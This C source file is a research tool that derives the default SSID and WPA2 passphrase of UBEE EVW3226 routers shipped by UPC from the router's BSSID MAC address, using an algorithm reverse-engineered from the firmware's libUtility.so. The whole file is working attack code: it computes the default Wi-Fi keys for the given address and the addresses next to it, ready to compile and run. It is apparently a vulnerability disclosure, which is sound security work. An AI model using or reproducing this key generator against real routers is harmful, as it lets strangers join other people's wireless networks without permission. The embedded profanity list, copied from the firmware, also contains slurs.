/**
 * UBEE EVW3226 WPA2 WiFi and SSID generator.
 * ==========================================
 *
 * This generator enables to generate a WPA2 passphrase and SSID solely
 * from BSSID MAC address for UBEE EVW3226 routers shipped
 * by UPC last few months (newest models). THe targeted firmware was EVW3226_1.0.20
 * We thus extend previous generator [1] so it works on 99% devices in the wild.
 *
 * With procedure described in [2] we were able to dump the whole router firmware from UBEE EVW3226.
 *
 * Algorithms were reverse engineered from a binary shared library /fss/gw/lib/libUtility.so
 * Both default SSID and passphrase generator algorithms read MAC address from file /nvram/1/1
 * Based on this the result is computed.
 *
 * The BSSID MAC address and MAC address used to compute the passphrase & SSID are shifted a bit.
 * For example, if 2.4GHz WiFi BSSID ends on f9 byte, the MAC address used for computation is f6.
 * From this reason this generator takes input MAC address and computes several SSIDs and passphrase
 * using MAC addresses near the original one.
 *
 * Important is if SSID matches, the passphrase matches.
 * The algorithm typically works for BSSID starting on: 647c34.
 *
 * Requires OpenSSL to build (MD5 algorithm)
 * gcc -o2 -Wall -o ubee_keys ubee_keys.c -lcrypto
 *
 * @author Dusan Klinec (ph4r05)
 * @author Miroslav Svitok (miroc)
 *
 * References:
 * [2]: https://haxx.in/upc_keys.c
 * [1]: https://firefart.at/post/upc_ubee_fail/
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <openssl/md5.h>

// Result of a passphrase generator is a password of 8 characters using classical english alphabet, uppercase.
// libUtility.so contains database of profanities. If any of word in this array happens to occur as a substring
// in the computed passphrase, new passphrase is generated, now using alphabet without vowels to avoid another profanity.
#define UBEE_NONINSULTING_ALPHABET "BBCDFFGHJJKLMNPQRSTVVWXYZZ"
// Simple macro to get size of profanities array
#define PROFANITY_COUNT (sizeof(profanities)/sizeof(profanities[0]))
// All profanities found in the source binary, alphabetically sorted, converted to upper case.
// Address in the original binary is 0x00040D74.
const char * profanities[] = {
        "ABBO",       "ABUSE",      "ACOCK",      "AGGRO",      "AIDS",       "ANAL",       "ANNAL",      "ANNAS",      "ARSES",
        "ARSIS",      "ASS",        "ASSAI",      "ASSAY",      "ASSES",      "ASSET",      "BABES",      "BALL",       "BALLS",
        "BALLY",      "BANAL",      "BANGS",      "BARFS",      "BARMY",      "BASTARD",    "BAWDS",      "BAWDY",      "BAWLS",
        "BEERS",      "BELCH",      "BIGOT",      "BIMBO",      "BINGE",      "BITCH",      "BLONDE",     "BLOOD",      "BLOW",
        "BLOWN",      "BLOWS",      "BLOWY",      "BOFFS",      "BOGAN",      "BOLES",      "BOLLS",      "BONDAGE",    "BONED",
        "BONER",      "BONGS",      "BONKS",      "BOOBS",      "BOOBY",      "BOOTY",      "BOOZE",      "BOOZY",      "BOWEL",
        "BOYS",       "BOZOS",      "BRATS",      "BROTHEL",    "BUSHY",      "BUSTS",      "BUSTY",      "BUTCH",      "BUTT",
        "BUTTE",      "BUTTS",      "BUTTY",      "BUXOM",      "CANAL",      "CARNY",      "CECUM",      "CHEST",      "CHICS",
        "CHINK",      "CHOAD",      "CHOTT",      "CHOWS",      "CHUBS",      "CHUCK",      "CHUFA",      "CHURR",      "CLITS",
        "COCCI",      "COCK",       "COCKS",      "COCKY",      "COCOS",      "COKED",      "COKES",      "COOFS",      "COON",
        "COONS",      "CRABS",      "CRACK",      "CRAP",       "CRAPS",      "CROZE",      "CRUCK",      "CRUDE",      "CRUDS",
        "CUM",        "CUMIN",      "CUNT",       "CUNTS",      "CUPEL",      "CURNS",      "CURST",      "CURVY",      "CUTIE",
        "DAGOS",      "DANDY",      "DARKY",      "DEMON",      "DESEX",      "DEVIL",      "DICK",       "DICKS",      "DICKY",
        "DIKED",      "DIKER",      "DIKES",      "DIKEY",      "DILDO",      "DIRT",       "DIRTY",      "DITCH",      "DODGE",
        "DODGY",      "DOGGY",      "DONGA",      "DONGS",      "DOPE",       "DOPED",      "DOPER",      "DORKS",      "DORKY",
        "DRAPE",      "DRUBS",      "DRUGS",      "DRUNK",      "DRUPE",      "DRUSE",      "DUMB",       "DWARF",      "DWEEB",
        "DYKED",      "DYKES",      "DYKEY",      "DYNES",      "EBONY",      "ENEMA",      "ERECT",      "EVILS",      "FADOS",
        "FAERY",      "FAG",        "FAGOT",      "FAIRY",      "FANNY",      "FANON",      "FARDS",      "FARTS",      "FATSO",
        "FATTY",      "FATWA",      "FAUGH",      "FECAL",      "FECES",      "FECKS",      "FEELS",      "FEEZE",      "FELCH",
        "FETAL",      "FETAS",      "FILCH",      "FILTH",      "FISHY",      "FISTS",      "FITCH",      "FITLY",      "FLAPS",
        "FLESH",      "FLEWS",      "FLEYS",      "FLOGS",      "FLONG",      "FORKS",      "FORKY",      "FORME",      "FREAK",
        "FRIGS",      "FRUMP",      "FUCK",       "FUCKS",      "FUCUS",      "FUDGE",      "FUGGY",      "FUSTY",      "FUZEE",
        "FUZES",      "FUZZY",      "FYKES",      "FYTTE",      "GAILY",      "GANJA",      "GAPED",      "GAPER",      "GAPES",
        "GAPPY",      "GASTS",      "GEEKS",      "GIMP",       "GIRLS",      "GIRLY",      "GIVER",      "GIZED",      "GONAD",
        "GOOEY",      "GOOFS",      "GOOFY",      "GOOKS",      "GOONS",      "GOOPS",      "GOOPY",      "GRAPE",      "GROAT",
        "GROGS",      "GROIN",      "GROPE",      "GUANO",      "HADAL",      "HADED",      "HADES",      "HADJI",      "HADST",
        "HAEMS",      "HAETS",      "HAIRY",      "HAREM",      "HATE",       "HEAD",       "HEMES",      "HEMPS",      "HEMPY",
        "HERPES",     "HOBOS",      "HOKED",      "HOKES",      "HOKEY",      "HOKKU",      "HOKUM",      "HOLE",       "HOMER",
        "HOMES",      "HOMEY",      "HOMOS",      "HONKY",      "HOOCH",      "HOOKA",      "HORNY",      "HUMPH",      "HUMPS",
        "HUMPY",      "HUSSY",      "HUTCH",      "HUZZA",      "HYING",      "HYMEN",      "HYPOS",      "IDIOT",      "ITCHY",
        "JAIL",       "JERKS",      "JERKY",      "JOCKS",      "JOINT",      "JORAM",      "JORUM",      "JOTAS",      "JOUAL",
        "JOUKS",      "JUDAS",      "JUGUM",      "KIKES",      "KILIM",      "KINKS",      "KINKY",      "KNOBS",      "KOLOS",
        "KONKS",      "KOOKS",      "KOOKY",      "KOPHS",      "KOPJE",      "KOPPA",      "KOTOS",      "KRAFT",      "LABIA",
        "LABRA",      "LATEX",      "LEERS",      "LEERY",      "LEGGY",      "LEMON",      "LEPTA",      "LETCH",      "LEZZY",
        "LICK",       "LICKS",      "LIDOS",      "LIMEY",      "LOADS",      "LOSER",      "LOVED",      "LOVER",      "LOVES",
        "LOWED",      "LUSTS",      "LUSTY",      "LYSES",      "LYSIN",      "LYSIS",      "LYSSA",      "LYTTA",      "MAARS",
        "MADAM",      "MANIA",      "MANIC",      "MICHE",      "MICKS",      "MICRA",      "MILF",       "MINGE",      "MOANS",
        "MOIST",      "MOLES",      "MOLEST",     "MORON",      "MOUNT",      "MOUTH",      "MUCKS",      "MUCKY",      "MUCOR",
        "MUCRO",      "MUCUS",      "MUFFS",      "NAIVE",      "NAKED",      "NANCY",      "NARCO",      "NARCS",      "NARDS",
        "NARES",      "NARKS",      "NARKY",      "NASAL",      "NASTY",      "NATAL",      "NATCH",      "NATES",      "NERDS",
        "NIGER",      "NOGGS",      "NOHOW",      "NOILS",      "NOSEY",      "NUBIA",      "NUCHA",      "NUDER",      "NUDES",
        "NUDIE",      "NUKED",      "NUKES",      "OBESE",      "OPING",      "OPIUM",      "OVARY",      "PADDY",      "PANSY",
        "PANTS",      "PENIS",      "PERKY",      "PILEI",      "PILES",      "PILIS",      "PILLS",      "PIMP",       "PIMPS",
        "PISS",       "PLUCK",      "PLUGS",      "PLUMP",      "POKED",      "POKER",      "POKES",      "POKEY",      "POLED",
        "POLER",      "POMMY",      "POODS",      "POOFS",      "POOFY",      "POOPS",      "PORGY",      "PORKS",      "PORKY",
        "PORN",       "PORNO",      "PORNS",      "POSED",      "POTTO",      "POTTY",      "POUFS",      "PREST",      "PREXY",
        "PRICK",      "PROSO",      "PROSTITUTE", "PROSY",      "PUBES",      "PUBIC",      "PUBIS",      "PUCKS",      "PUDIC",
        "PUFFS",      "PUFFY",      "PUKED",      "PUKES",      "PUNTO",      "PUNTS",      "PUNTY",      "PUPAE",      "PUSSY",
        "PUTTI",      "PUTTO",      "QUEER",      "QUIFF",      "RABBI",      "RABID",      "RACES",      "RACKS",      "RANDY",
        "RAPED",      "RAPER",      "RAPES",      "RECKS",      "RECTA",      "RECTI",      "RECTO",      "RIGID",      "RIMED",
        "RIMER",      "RIMES",      "ROMPS",      "ROOTS",      "ROOTY",      "ROWDY",      "RUMPS",      "RUTHRUSH",   "SCABS",
        "SCATS",      "SCATT",      "SCORE",      "SCRAG",      "SCREW",      "SCRIM",      "SEAM",       "SEEDY",      "SELVA",
        "SEMEN",      "SEWER",      "SEX",        "SEXED",      "SEXES",      "SEXTS",      "SHAFT",      "SHAGS",      "SHIT",
        "SHITS",      "SICKO",      "SICKS",      "SIRED",      "SIREN",      "SIRES",      "SIRUP",      "SISSY",      "SKIRT",
        "SLITS",      "SLOID",      "SLOPS",      "SLOTS",      "SLOWS",      "SLOYD",      "SLUT",       "SLUTS",      "SLYER",
        "SMACK",      "SMOKE",      "SMOKY",      "SMUT",       "SMUTS",      "SNOGS",      "SNOOD",      "SNOOK",      "SNOOL",
        "SNORT",      "SNOTS",      "SNUFF",      "SOOTH",      "SOOTS",      "SPANK",      "SPERM",      "SPEWS",      "SPICA",
        "SPICE",      "SPICK",      "SPICS",      "SPUNK",      "SQUAW",      "STIFF",      "STINK",      "STOOL",      "STRIP",
        "STUDS",      "SUCK",       "SUCKS",      "SUCRE",      "SUDDS",      "SUDOR",      "SWANG",      "SWANK",      "TARTS",
        "TARTY",      "TESTA",      "TESTS",      "TESTY",      "THIEF",      "THUDS",      "THUGS",      "THUJA",      "TIGHT",
        "TIGON",      "TIKES",      "TIKIS",      "TITS",       "TITTY",      "TUBAS",      "TUBBY",      "TUBED",      "TUCKS",
        "TURD",       "TURDS",      "TWATS",      "UDDER",      "UNDEE",      "UNDIE",      "UNSEX",      "UNZIP",      "UREAL",
        "UREAS",      "UREIC",      "URIAL",      "URINE",      "UVEAL",      "UVEAS",      "UVULA",      "VACUA",      "VAGINA",
        "VAGUS",      "VEINS",      "VEINY",      "VELAR",      "VELDS",      "VOMIT",      "VUGGY",      "VULGO",      "VULVA",
        "WACKS",      "WARTS",      "WEIRD",      "WENCH",      "WETLY",      "WHACK",      "WHOPS",      "WHORE",      "WILLY",
        "WIMPS",      "WIMPY",      "WINED",      "WINES",      "WINEY",      "WIZEN",      "WOADS",      "WODGE",      "WOFUL",
        "WOKEN",      "WOLDS",      "WOMAN",      "WOMBS",      "WOMBY",      "WOMEN",      "WONKS",      "WONKY",      "WOOED",
        "WOOER",      "WOOSH",      "WOOZY",      "YOBBO",      "ZOOID",      "ZOOKS"
};

// Generates default SSID from source MAC
int ubee_generate_ssid(unsigned const char * mac, unsigned char * ssid, size_t * len);
// Generates default passphrase from source MAC, with profanity checking
int ubee_generate_pass(unsigned const char * mac, unsigned char * passwd, size_t * len);
// Generates default passphrase from source MAC, may contain profanity
int ubee_generate_pass_raw(unsigned const char * mac, unsigned char * hash_buff, unsigned char * passwd);
// Generates a new default passphrase, if the original had profanity as a substring
int ubee_enerate_profanity_free_pass(unsigned char * hash_buff, unsigned char const * new_pass);
// Math ADD operation on MAC address
void incmac(unsigned char * mac, unsigned char * newmac, int delta);
// Read MAC from hex string
int readmac(char const * machex, unsigned char * mac);

void banner(void) {
        printf(
                "\n"
                        "==================================================================================\n"
                        " upc_ubee_keys // WPA2 passphrase recovery tool for UPC%%07d UBEE EVW3226 devices \n"
                        "==================================================================================\n"
                        "by ph4r05, miroc\n\n"
        );
}

void usage(char *prog) {
        printf(" Usage: %s <MAC>\n", prog);
        printf("  - MAC is in hexadecimal format, last 3 bytes\n");
        printf("  - As a demonstration, here is output for some mac address\n\n");
}

int main(int argc, char * argv[]){
    unsigned char mac[] = {0x64, 0x7c, 0x34, 0x19, 0x3c, 0x00};
    unsigned char ssid[16];
    unsigned char pass[16];
    int i;

    // Banner + usage.
    // Reading MAC from parameter.
    banner();
    if (argc != 2 || strlen(argv[1]) != 6) {
        usage(argv[0]);
    } else {
        if (readmac(argv[1], mac) < 0){
            printf(" ERROR: invalid MAC address entered\n");
        }
    }

    ubee_generate_ssid(mac, ssid, NULL);
    ubee_generate_pass(mac, pass, NULL);
    printf("  your-BSSID: %.02X%.02X%.02X%.02X%.02X%.02X, SSID: %s, PASS: %s\n\n",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], ssid, pass);

    // Source MAC address used for computation of SSID & key is shifted.
    // E.g. if BSSID of WiFi ends on f9, the mac used for computation is f6 for 2.4GHz network.
    // But the same MAC is used for computation both SSID and key so thus if SSID matches, the key matches.
    for(i=-7; i<5; i++){
        unsigned char newMac[6];
        char * indicator = "";
        incmac(mac, newMac, i);
        ubee_generate_ssid(newMac, ssid, NULL);
        ubee_generate_pass(newMac, pass, NULL);

        if (i==-3){
            indicator = " <-- 2.4 Ghz";
        } else if (i==-1){
            indicator = " <-- 5.0 GHz";
        }

        printf("  near-BSSID: %.02X%.02X%.02X%.02X%.02X%.02X, SSID: %s, PASS: %s %s\n",
               newMac[0], newMac[1], newMac[2], newMac[3], newMac[4], newMac[5], ssid, pass, indicator);
    }
}

int ubee_generate_ssid(unsigned const char * mac, unsigned char * ssid, size_t * len)
{
    MD5_CTX ctx;
    unsigned char buff1[100];
    unsigned char buff2[100];
    unsigned char h1[100], h2[100];
    memset(buff1, 0, 100);
    memset(buff2, 0, 100);
    memset(h1, 0, 100);
    memset(h2, 0, 100);

    if (len != NULL && *len < 11){
        return -1;
    }

    // MAC+hex(UPCDEAULTSSID)
    sprintf((char*)buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5453534944", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    MD5_Init(&ctx);
    MD5_Update(&ctx, buff1, strlen((char*)buff1) + 1);
    MD5_Final(h1, &ctx);

    sprintf((char*)buff2, "%.02X%.02X%.02X%.02X%.02X%.02X", h1[0]&0xf, h1[1]&0xf, h1[2]&0xf, h1[3]&0xf, h1[4]&0xf, h1[5]&0xf);

    MD5_Init(&ctx);
    MD5_Update(&ctx, buff2, strlen((char*)buff2) + 1);
    MD5_Final(h2, &ctx);

    sprintf((char*)ssid, "UPC%d%d%d%d%d%d%d", h2[0]%10, h2[1]%10, h2[2]%10, h2[3]%10, h2[4]%10, h2[5]%10, h2[6]%10);
    if (len != NULL){
        *len = 10;
    }

    return 1;
}

int ubee_generate_pass(unsigned const char * mac, unsigned char * passwd, size_t * len)
{
    unsigned int i=0,p=0;
    unsigned char hash_buff[100];

    if (len != NULL && *len < 9){
        return -1;
    }

    ubee_generate_pass_raw(mac, hash_buff, passwd);
    for(i=0; i<PROFANITY_COUNT; i++){
        if (strstr((char*)passwd, profanities[i]) != NULL){
            p=1;
            break;
        }
    }

    if (p>0){
        ubee_enerate_profanity_free_pass(hash_buff, passwd);
    }

    if (len != NULL){
        *len=8;
    }

    return 1;
}

int ubee_generate_pass_raw(unsigned const char * mac, unsigned char * hash_buff, unsigned char * passwd)
{
    MD5_CTX ctx;
    unsigned char buff1[100];
    unsigned char buff2[100];
    unsigned char buff3[100];
    memset(buff1, 0, 100);
    memset(buff2, 0, 100);
    memset(buff3, 0, 100);
    memset(hash_buff, 0, 100);

    // 1. MAC + hex(UPCDEAULTPASSPHRASE)
    sprintf((char*)buff1, "%2X%2X%2X%2X%2X%2X555043444541554C5450415353504852415345", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    // 2.
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff1, strlen((char*)buff1)+1);
    MD5_Final(buff2, &ctx);

    // 3.
    sprintf((char*)buff3, "%.02X%.02X%.02X%.02X%.02X%.02X", buff2[0]&0xF, buff2[1]&0xF, buff2[2]&0xF, buff2[3]&0xF, buff2[4]&0xF, buff2[5]&0xF);

    // 4.
    MD5_Init(&ctx);
    MD5_Update(&ctx, buff3, strlen((char*)buff3)+1);
    MD5_Final(hash_buff, &ctx);

    sprintf((char*)passwd, "%c%c%c%c%c%c%c%c",
            0x41u + ((hash_buff[0]+hash_buff[8]) % 0x1Au),
            0x41u + ((hash_buff[1]+hash_buff[9]) % 0x1Au),
            0x41u + ((hash_buff[2]+hash_buff[10]) % 0x1Au),
            0x41u + ((hash_buff[3]+hash_buff[11]) % 0x1Au),
            0x41u + ((hash_buff[4]+hash_buff[12]) % 0x1Au),
            0x41u + ((hash_buff[5]+hash_buff[13]) % 0x1Au),
            0x41u + ((hash_buff[6]+hash_buff[14]) % 0x1Au),
            0x41u + ((hash_buff[7]+hash_buff[15]) % 0x1Au));

    return 0;
}

int ubee_enerate_profanity_free_pass(unsigned char * hash_buff, unsigned char const * new_pass)
{
    sprintf((char*)new_pass, "%c%c%c%c%c%c%c%c",
            UBEE_NONINSULTING_ALPHABET[((hash_buff[0]+hash_buff[8]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[1]+hash_buff[9]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[2]+hash_buff[10]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[3]+hash_buff[11]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[4]+hash_buff[12]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[5]+hash_buff[13]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[6]+hash_buff[14]) % 0x1Au)],
            UBEE_NONINSULTING_ALPHABET[((hash_buff[7]+hash_buff[15]) % 0x1Au)]);
    return 0;
}

void incmac(unsigned char * mac, unsigned char * newmac, int delta)
{
    uint64_t macInt = 0;
    int i = 0;
    for(i = 0; i<6; i++){
        macInt |= ((uint64_t)(mac[i] & 0xFFu)) << (8*(5-i));
    }

    macInt += delta;
    for(i = 0; i<6; i++){
        newmac[i] = (macInt >> (8*(5-i))) & 0xFFu;
    }
}

int readmac(char const * machex, unsigned char * mac)
{
    int i;
    for(i=0; i<3; i++){
        mac[3+i] = 0;
    }

    for(i=0; i<6; i++){
        int v;
        int c = toupper(machex[i]);
        if (c>='0' && c<='9'){
            v = c-'0';
        } else if (c>='A' && c<='F'){
            v = 10+c-'A';
        } else {
            return -1;
        }

        mac[3+i/2] |= (v) << 4*((i+1)%2);
    }

    return 0;
}
